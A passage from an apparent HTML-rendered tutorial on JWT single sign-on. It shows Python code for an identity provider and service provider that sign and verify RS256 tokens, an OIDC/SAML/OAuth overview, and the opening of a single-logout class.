<a id="__codelineno-46-64" name="__codelineno-46-64" href="#__codelineno-46-64"></a>            <span class="s1">&#39;jti&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;sso_</span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s1">_</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
<a id="__codelineno-46-65" name="__codelineno-46-65" href="#__codelineno-46-65"></a>
<a id="__codelineno-46-66" name="__codelineno-46-66" href="#__codelineno-46-66"></a>            <span class="c1"># User info</span>
<a id="__codelineno-46-67" name="__codelineno-46-67" href="#__codelineno-46-67"></a>            <span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
<a id="__codelineno-46-68" name="__codelineno-46-68" href="#__codelineno-46-68"></a>            <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
<a id="__codelineno-46-69" name="__codelineno-46-69" href="#__codelineno-46-69"></a>            <span class="s1">&#39;roles&#39;</span><span class="p">:</span> <span class="n">roles</span><span class="p">,</span>
<a id="__codelineno-46-70" name="__codelineno-46-70" href="#__codelineno-46-70"></a>
<a id="__codelineno-46-71" name="__codelineno-46-71" href="#__codelineno-46-71"></a>            <span class="c1"># SSO-specific</span>
<a id="__codelineno-46-72" name="__codelineno-46-72" href="#__codelineno-46-72"></a>            <span class="s1">&#39;session_id&#39;</span><span class="p">:</span> <span class="n">session_id</span><span class="p">,</span>
<a id="__codelineno-46-73" name="__codelineno-46-73" href="#__codelineno-46-73"></a>            <span class="s1">&#39;auth_time&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">now</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()),</span>
<a id="__codelineno-46-74" name="__codelineno-46-74" href="#__codelineno-46-74"></a>            <span class="s1">&#39;amr&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;pwd&#39;</span><span class="p">,</span> <span class="s1">&#39;mfa&#39;</span><span class="p">]</span>  <span class="c1"># Authentication methods</span>
<a id="__codelineno-46-75" name="__codelineno-46-75" href="#__codelineno-46-75"></a>        <span class="p">}</span>
<a id="__codelineno-46-76" name="__codelineno-46-76" href="#__codelineno-46-76"></a>
<a id="__codelineno-46-77" name="__codelineno-46-77" href="#__codelineno-46-77"></a>        <span class="c1"># Sign with private key</span>
<a id="__codelineno-46-78" name="__codelineno-46-78" href="#__codelineno-46-78"></a>        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
<a id="__codelineno-46-79" name="__codelineno-46-79" href="#__codelineno-46-79"></a>            <span class="n">payload</span><span class="p">,</span>
<a id="__codelineno-46-80" name="__codelineno-46-80" href="#__codelineno-46-80"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">private_key</span><span class="p">,</span>
<a id="__codelineno-46-81" name="__codelineno-46-81" href="#__codelineno-46-81"></a>            <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;RS256&#39;</span><span class="p">,</span>
<a id="__codelineno-46-82" name="__codelineno-46-82" href="#__codelineno-46-82"></a>            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;kid&#39;</span><span class="p">:</span> <span class="s1">&#39;sso-key-2024&#39;</span><span class="p">}</span>
<a id="__codelineno-46-83" name="__codelineno-46-83" href="#__codelineno-46-83"></a>        <span class="p">)</span>
<a id="__codelineno-46-84" name="__codelineno-46-84" href="#__codelineno-46-84"></a>
<a id="__codelineno-46-85" name="__codelineno-46-85" href="#__codelineno-46-85"></a>        <span class="k">return</span> <span class="n">token</span>
<a id="__codelineno-46-86" name="__codelineno-46-86" href="#__codelineno-46-86"></a>
<a id="__codelineno-46-87" name="__codelineno-46-87" href="#__codelineno-46-87"></a>
<a id="__codelineno-46-88" name="__codelineno-46-88" href="#__codelineno-46-88"></a><span class="c1"># Service Provider (Application)</span>
<a id="__codelineno-46-89" name="__codelineno-46-89" href="#__codelineno-46-89"></a><span class="k">class</span><span class="w"> </span><span class="nc">SSOServiceProvider</span><span class="p">:</span>
<a id="__codelineno-46-90" name="__codelineno-46-90" href="#__codelineno-46-90"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Application that uses SSO for authentication&quot;&quot;&quot;</span>
<a id="__codelineno-46-91" name="__codelineno-46-91" href="#__codelineno-46-91"></a>
<a id="__codelineno-46-92" name="__codelineno-46-92" href="#__codelineno-46-92"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">app_name</span><span class="p">,</span> <span class="n">audience</span><span class="p">,</span> <span class="n">idp_public_key</span><span class="p">,</span> <span class="n">idp_issuer</span><span class="p">):</span>
<a id="__codelineno-46-93" name="__codelineno-46-93" href="#__codelineno-46-93"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">app_name</span> <span class="o">=</span> <span class="n">app_name</span>
<a id="__codelineno-46-94" name="__codelineno-46-94" href="#__codelineno-46-94"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">audience</span> <span class="o">=</span> <span class="n">audience</span>
<a id="__codelineno-46-95" name="__codelineno-46-95" href="#__codelineno-46-95"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">idp_public_key</span> <span class="o">=</span> <span class="n">idp_public_key</span>
<a id="__codelineno-46-96" name="__codelineno-46-96" href="#__codelineno-46-96"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">idp_issuer</span> <span class="o">=</span> <span class="n">idp_issuer</span>
<a id="__codelineno-46-97" name="__codelineno-46-97" href="#__codelineno-46-97"></a>
<a id="__codelineno-46-98" name="__codelineno-46-98" href="#__codelineno-46-98"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">handle_sso_callback</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
<a id="__codelineno-46-99" name="__codelineno-46-99" href="#__codelineno-46-99"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Handle callback from IdP with JWT token&quot;&quot;&quot;</span>
<a id="__codelineno-46-100" name="__codelineno-46-100" href="#__codelineno-46-100"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-46-101" name="__codelineno-46-101" href="#__codelineno-46-101"></a>            <span class="c1"># Verify JWT</span>
<a id="__codelineno-46-102" name="__codelineno-46-102" href="#__codelineno-46-102"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
<a id="__codelineno-46-103" name="__codelineno-46-103" href="#__codelineno-46-103"></a>                <span class="n">token</span><span class="p">,</span>
<a id="__codelineno-46-104" name="__codelineno-46-104" href="#__codelineno-46-104"></a>                <span class="bp">self</span><span class="o">.</span><span class="n">idp_public_key</span><span class="p">,</span>
<a id="__codelineno-46-105" name="__codelineno-46-105" href="#__codelineno-46-105"></a>                <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;RS256&#39;</span><span class="p">],</span>
<a id="__codelineno-46-106" name="__codelineno-46-106" href="#__codelineno-46-106"></a>                <span class="n">audience</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">audience</span><span class="p">,</span>
<a id="__codelineno-46-107" name="__codelineno-46-107" href="#__codelineno-46-107"></a>                <span class="n">issuer</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">idp_issuer</span><span class="p">,</span>
<a id="__codelineno-46-108" name="__codelineno-46-108" href="#__codelineno-46-108"></a>                <span class="n">options</span><span class="o">=</span><span class="p">{</span>
<a id="__codelineno-46-109" name="__codelineno-46-109" href="#__codelineno-46-109"></a>                    <span class="s1">&#39;verify_signature&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-46-110" name="__codelineno-46-110" href="#__codelineno-46-110"></a>                    <span class="s1">&#39;verify_exp&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-46-111" name="__codelineno-46-111" href="#__codelineno-46-111"></a>                    <span class="s1">&#39;verify_aud&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-46-112" name="__codelineno-46-112" href="#__codelineno-46-112"></a>                    <span class="s1">&#39;verify_iss&#39;</span><span class="p">:</span> <span class="kc">True</span>
<a id="__codelineno-46-113" name="__codelineno-46-113" href="#__codelineno-46-113"></a>                <span class="p">}</span>
<a id="__codelineno-46-114" name="__codelineno-46-114" href="#__codelineno-46-114"></a>            <span class="p">)</span>
<a id="__codelineno-46-115" name="__codelineno-46-115" href="#__codelineno-46-115"></a>
<a id="__codelineno-46-116" name="__codelineno-46-116" href="#__codelineno-46-116"></a>            <span class="c1"># Check if this app is in the audience</span>
<a id="__codelineno-46-117" name="__codelineno-46-117" href="#__codelineno-46-117"></a>            <span class="n">audiences</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;aud&#39;</span><span class="p">,</span> <span class="p">[])</span>
<a id="__codelineno-46-118" name="__codelineno-46-118" href="#__codelineno-46-118"></a>            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">audiences</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-46-119" name="__codelineno-46-119" href="#__codelineno-46-119"></a>                <span class="n">audiences</span> <span class="o">=</span> <span class="p">[</span><span class="n">audiences</span><span class="p">]</span>
<a id="__codelineno-46-120" name="__codelineno-46-120" href="#__codelineno-46-120"></a>
<a id="__codelineno-46-121" name="__codelineno-46-121" href="#__codelineno-46-121"></a>            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">audience</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">audiences</span><span class="p">:</span>
<a id="__codelineno-46-122" name="__codelineno-46-122" href="#__codelineno-46-122"></a>                <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Token not intended for this app&#39;</span><span class="p">}</span>
<a id="__codelineno-46-123" name="__codelineno-46-123" href="#__codelineno-46-123"></a>
<a id="__codelineno-46-124" name="__codelineno-46-124" href="#__codelineno-46-124"></a>            <span class="c1"># Create local session</span>
<a id="__codelineno-46-125" name="__codelineno-46-125" href="#__codelineno-46-125"></a>            <span class="n">user_session</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-46-126" name="__codelineno-46-126" href="#__codelineno-46-126"></a>                <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;sub&#39;</span><span class="p">],</span>
<a id="__codelineno-46-127" name="__codelineno-46-127" href="#__codelineno-46-127"></a>                <span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span>
<a id="__codelineno-46-128" name="__codelineno-46-128" href="#__codelineno-46-128"></a>                <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
<a id="__codelineno-46-129" name="__codelineno-46-129" href="#__codelineno-46-129"></a>                <span class="s1">&#39;roles&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;roles&#39;</span><span class="p">],</span>
<a id="__codelineno-46-130" name="__codelineno-46-130" href="#__codelineno-46-130"></a>                <span class="s1">&#39;sso_session_id&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">],</span>
<a id="__codelineno-46-131" name="__codelineno-46-131" href="#__codelineno-46-131"></a>                <span class="s1">&#39;authenticated_at&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;auth_time&#39;</span><span class="p">]</span>
<a id="__codelineno-46-132" name="__codelineno-46-132" href="#__codelineno-46-132"></a>            <span class="p">}</span>
<a id="__codelineno-46-133" name="__codelineno-46-133" href="#__codelineno-46-133"></a>
<a id="__codelineno-46-134" name="__codelineno-46-134" href="#__codelineno-46-134"></a>            <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-46-135" name="__codelineno-46-135" href="#__codelineno-46-135"></a>                <span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-46-136" name="__codelineno-46-136" href="#__codelineno-46-136"></a>                <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">user_session</span>
<a id="__codelineno-46-137" name="__codelineno-46-137" href="#__codelineno-46-137"></a>            <span class="p">}</span>
<a id="__codelineno-46-138" name="__codelineno-46-138" href="#__codelineno-46-138"></a>
<a id="__codelineno-46-139" name="__codelineno-46-139" href="#__codelineno-46-139"></a>        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>
<a id="__codelineno-46-140" name="__codelineno-46-140" href="#__codelineno-46-140"></a>            <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Token expired&#39;</span><span class="p">}</span>
<a id="__codelineno-46-141" name="__codelineno-46-141" href="#__codelineno-46-141"></a>        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
<a id="__codelineno-46-142" name="__codelineno-46-142" href="#__codelineno-46-142"></a>            <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Invalid token: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
<a id="__codelineno-46-143" name="__codelineno-46-143" href="#__codelineno-46-143"></a>
<a id="__codelineno-46-144" name="__codelineno-46-144" href="#__codelineno-46-144"></a>
<a id="__codelineno-46-145" name="__codelineno-46-145" href="#__codelineno-46-145"></a><span class="c1"># Example Usage</span>
<a id="__codelineno-46-146" name="__codelineno-46-146" href="#__codelineno-46-146"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-46-147" name="__codelineno-46-147" href="#__codelineno-46-147"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;SSO Flow Example&quot;</span><span class="p">)</span>
<a id="__codelineno-46-148" name="__codelineno-46-148" href="#__codelineno-46-148"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-46-149" name="__codelineno-46-149" href="#__codelineno-46-149"></a>
<a id="__codelineno-46-150" name="__codelineno-46-150" href="#__codelineno-46-150"></a><span class="c1"># 1. User authenticates with IdP</span>
<a id="__codelineno-46-151" name="__codelineno-46-151" href="#__codelineno-46-151"></a><span class="n">idp</span> <span class="o">=</span> <span class="n">SSOIdentityProvider</span><span class="p">(</span>
<a id="__codelineno-46-152" name="__codelineno-46-152" href="#__codelineno-46-152"></a>    <span class="n">private_key</span><span class="o">=</span><span class="n">load_private_key</span><span class="p">(),</span>
<a id="__codelineno-46-153" name="__codelineno-46-153" href="#__codelineno-46-153"></a>    <span class="n">issuer_url</span><span class="o">=</span><span class="s1">&#39;https://auth.example.com&#39;</span>
<a id="__codelineno-46-154" name="__codelineno-46-154" href="#__codelineno-46-154"></a><span class="p">)</span>
<a id="__codelineno-46-155" name="__codelineno-46-155" href="#__codelineno-46-155"></a>
<a id="__codelineno-46-156" name="__codelineno-46-156" href="#__codelineno-46-156"></a><span class="n">auth_result</span> <span class="o">=</span> <span class="n">idp</span><span class="o">.</span><span class="n">authenticate_user</span><span class="p">(</span><span class="s1">&#39;john@example.com&#39;</span><span class="p">,</span> <span class="s1">&#39;password123&#39;</span><span class="p">)</span>
<a id="__codelineno-46-157" name="__codelineno-46-157" href="#__codelineno-46-157"></a><span class="k">if</span> <span class="n">auth_result</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]:</span>
<a id="__codelineno-46-158" name="__codelineno-46-158" href="#__codelineno-46-158"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; User authenticated&quot;</span><span class="p">)</span>
<a id="__codelineno-46-159" name="__codelineno-46-159" href="#__codelineno-46-159"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SSO Token: </span><span class="si">{</span><span class="n">auth_result</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">][:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
<a id="__codelineno-46-160" name="__codelineno-46-160" href="#__codelineno-46-160"></a>    <span class="n">sso_token</span> <span class="o">=</span> <span class="n">auth_result</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span>
<a id="__codelineno-46-161" name="__codelineno-46-161" href="#__codelineno-46-161"></a>
<a id="__codelineno-46-162" name="__codelineno-46-162" href="#__codelineno-46-162"></a><span class="c1"># 2. User accesses App 1 (Gmail)</span>
<a id="__codelineno-46-163" name="__codelineno-46-163" href="#__codelineno-46-163"></a><span class="n">app1</span> <span class="o">=</span> <span class="n">SSOServiceProvider</span><span class="p">(</span>
<a id="__codelineno-46-164" name="__codelineno-46-164" href="#__codelineno-46-164"></a>    <span class="n">app_name</span><span class="o">=</span><span class="s1">&#39;Gmail&#39;</span><span class="p">,</span>
<a id="__codelineno-46-165" name="__codelineno-46-165" href="#__codelineno-46-165"></a>    <span class="n">audience</span><span class="o">=</span><span class="s1">&#39;https://gmail.example.com&#39;</span><span class="p">,</span>
<a id="__codelineno-46-166" name="__codelineno-46-166" href="#__codelineno-46-166"></a>    <span class="n">idp_public_key</span><span class="o">=</span><span class="n">load_public_key</span><span class="p">(),</span>
<a id="__codelineno-46-167" name="__codelineno-46-167" href="#__codelineno-46-167"></a>    <span class="n">idp_issuer</span><span class="o">=</span><span class="s1">&#39;https://auth.example.com&#39;</span>
<a id="__codelineno-46-168" name="__codelineno-46-168" href="#__codelineno-46-168"></a><span class="p">)</span>
<a id="__codelineno-46-169" name="__codelineno-46-169" href="#__codelineno-46-169"></a>
<a id="__codelineno-46-170" name="__codelineno-46-170" href="#__codelineno-46-170"></a><span class="n">app1_result</span> <span class="o">=</span> <span class="n">app1</span><span class="o">.</span><span class="n">handle_sso_callback</span><span class="p">(</span><span class="n">sso_token</span><span class="p">)</span>
<a id="__codelineno-46-171" name="__codelineno-46-171" href="#__codelineno-46-171"></a><span class="k">if</span> <span class="n">app1_result</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]:</span>
<a id="__codelineno-46-172" name="__codelineno-46-172" href="#__codelineno-46-172"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> App 1 (Gmail) access granted&quot;</span><span class="p">)</span>
<a id="__codelineno-46-173" name="__codelineno-46-173" href="#__codelineno-46-173"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User: </span><span class="si">{</span><span class="n">app1_result</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-46-174" name="__codelineno-46-174" href="#__codelineno-46-174"></a>
<a id="__codelineno-46-175" name="__codelineno-46-175" href="#__codelineno-46-175"></a><span class="c1"># 3. User accesses App 2 (Drive) - Same token!</span>
<a id="__codelineno-46-176" name="__codelineno-46-176" href="#__codelineno-46-176"></a><span class="n">app2</span> <span class="o">=</span> <span class="n">SSOServiceProvider</span><span class="p">(</span>
<a id="__codelineno-46-177" name="__codelineno-46-177" href="#__codelineno-46-177"></a>    <span class="n">app_name</span><span class="o">=</span><span class="s1">&#39;Drive&#39;</span><span class="p">,</span>
<a id="__codelineno-46-178" name="__codelineno-46-178" href="#__codelineno-46-178"></a>    <span class="n">audience</span><span class="o">=</span><span class="s1">&#39;https://drive.example.com&#39;</span><span class="p">,</span>
<a id="__codelineno-46-179" name="__codelineno-46-179" href="#__codelineno-46-179"></a>    <span class="n">idp_public_key</span><span class="o">=</span><span class="n">load_public_key</span><span class="p">(),</span>
<a id="__codelineno-46-180" name="__codelineno-46-180" href="#__codelineno-46-180"></a>    <span class="n">idp_issuer</span><span class="o">=</span><span class="s1">&#39;https://auth.example.com&#39;</span>
<a id="__codelineno-46-181" name="__codelineno-46-181" href="#__codelineno-46-181"></a><span class="p">)</span>
<a id="__codelineno-46-182" name="__codelineno-46-182" href="#__codelineno-46-182"></a>
<a id="__codelineno-46-183" name="__codelineno-46-183" href="#__codelineno-46-183"></a><span class="n">app2_result</span> <span class="o">=</span> <span class="n">app2</span><span class="o">.</span><span class="n">handle_sso_callback</span><span class="p">(</span><span class="n">sso_token</span><span class="p">)</span>
<a id="__codelineno-46-184" name="__codelineno-46-184" href="#__codelineno-46-184"></a><span class="k">if</span> <span class="n">app2_result</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]:</span>
<a id="__codelineno-46-185" name="__codelineno-46-185" href="#__codelineno-46-185"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> App 2 (Drive) access granted&quot;</span><span class="p">)</span>
<a id="__codelineno-46-186" name="__codelineno-46-186" href="#__codelineno-46-186"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User: </span><span class="si">{</span><span class="n">app2_result</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-46-187" name="__codelineno-46-187" href="#__codelineno-46-187"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;No re-authentication needed! &quot;</span><span class="p">)</span>
</code></pre></div>
<h3 id="sso-protocols-using-jwt">SSO Protocols Using JWT</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>              SSO Protocols with JWT                        
<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>                                                             
<a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>  1. OpenID Connect (OIDC)                                  
<a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>                                       
<a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>      Built on OAuth 2.0                                   
<a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>      Uses JWT for ID tokens                               
<a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>      Most popular modern SSO                              
<a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>      Examples: Auth0, Okta, Google Sign-In               
<a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>                                                             
<a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>     Flow:                                                   
<a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a>     User  IdP  JWT ID Token  App                       
<a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a>                                                             
<a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a>     ID Token Structure:                                     
<a id="__codelineno-47-16" name="__codelineno-47-16" href="#__codelineno-47-16"></a>     {                                                       
<a id="__codelineno-47-17" name="__codelineno-47-17" href="#__codelineno-47-17"></a>       &quot;iss&quot;: &quot;https://accounts.google.com&quot;,                
<a id="__codelineno-47-18" name="__codelineno-47-18" href="#__codelineno-47-18"></a>       &quot;aud&quot;: &quot;your-app-client-id&quot;,                         
<a id="__codelineno-47-19" name="__codelineno-47-19" href="#__codelineno-47-19"></a>       &quot;sub&quot;: &quot;110169484474386276334&quot;,                      
<a id="__codelineno-47-20" name="__codelineno-47-20" href="#__codelineno-47-20"></a>       &quot;email&quot;: &quot;user@example.com&quot;,                         
<a id="__codelineno-47-21" name="__codelineno-47-21" href="#__codelineno-47-21"></a>       &quot;email_verified&quot;: true,                              
<a id="__codelineno-47-22" name="__codelineno-47-22" href="#__codelineno-47-22"></a>       &quot;name&quot;: &quot;John Doe&quot;,                                  
<a id="__codelineno-47-23" name="__codelineno-47-23" href="#__codelineno-47-23"></a>       &quot;picture&quot;: &quot;https://...&quot;,                            
<a id="__codelineno-47-24" name="__codelineno-47-24" href="#__codelineno-47-24"></a>       &quot;exp&quot;: 1735689600                                    
<a id="__codelineno-47-25" name="__codelineno-47-25" href="#__codelineno-47-25"></a>     }                                                       
<a id="__codelineno-47-26" name="__codelineno-47-26" href="#__codelineno-47-26"></a>                                                             
<a id="__codelineno-47-27" name="__codelineno-47-27" href="#__codelineno-47-27"></a>
<a id="__codelineno-47-28" name="__codelineno-47-28" href="#__codelineno-47-28"></a>                                                             
<a id="__codelineno-47-29" name="__codelineno-47-29" href="#__codelineno-47-29"></a>  2. SAML (Security Assertion Markup Language)              
<a id="__codelineno-47-30" name="__codelineno-47-30" href="#__codelineno-47-30"></a>                    
<a id="__codelineno-47-31" name="__codelineno-47-31" href="#__codelineno-47-31"></a>      XML-based (older standard)                           
<a id="__codelineno-47-32" name="__codelineno-47-32" href="#__codelineno-47-32"></a>      Enterprise SSO                                       
<a id="__codelineno-47-33" name="__codelineno-47-33" href="#__codelineno-47-33"></a>      Can use JWT in newer implementations                 
<a id="__codelineno-47-34" name="__codelineno-47-34" href="#__codelineno-47-34"></a>      Examples: Shibboleth, ADFS                           
<a id="__codelineno-47-35" name="__codelineno-47-35" href="#__codelineno-47-35"></a>                                                             
<a id="__codelineno-47-36" name="__codelineno-47-36" href="#__codelineno-47-36"></a>
<a id="__codelineno-47-37" name="__codelineno-47-37" href="#__codelineno-47-37"></a>                                                             
<a id="__codelineno-47-38" name="__codelineno-47-38" href="#__codelineno-47-38"></a>  3. OAuth 2.0 + JWT                                        
<a id="__codelineno-47-39" name="__codelineno-47-39" href="#__codelineno-47-39"></a>                                           
<a id="__codelineno-47-40" name="__codelineno-47-40" href="#__codelineno-47-40"></a>      JWT as access token                                  
<a id="__codelineno-47-41" name="__codelineno-47-41" href="#__codelineno-47-41"></a>      API authorization                                    
<a id="__codelineno-47-42" name="__codelineno-47-42" href="#__codelineno-47-42"></a>      Examples: GitHub, GitLab                             
<a id="__codelineno-47-43" name="__codelineno-47-43" href="#__codelineno-47-43"></a>                                                             
<a id="__codelineno-47-44" name="__codelineno-47-44" href="#__codelineno-47-44"></a>
</code></pre></div>
<h3 id="sso-logout-single-logout">SSO Logout (Single Logout)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">SSOLogout</span><span class="p">:</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Handle SSO logout across all applications&quot;&quot;&quot;</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">idp_url</span><span class="p">):</span>
<a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">idp_url</span> <span class="o">=</span> <span class="n">idp_url</span>
<a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">active_sessions</span> <span class="o">=</span> <span class="p">{}</span>
<a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>
<a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">logout</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session_id</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
<a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="sd">        Single logout: Invalidate session across all apps</span>
<a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="sd">        &quot;&quot;&quot;</span>
<a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a>        <span class="c1"># 1. Revoke SSO session at IdP</span>
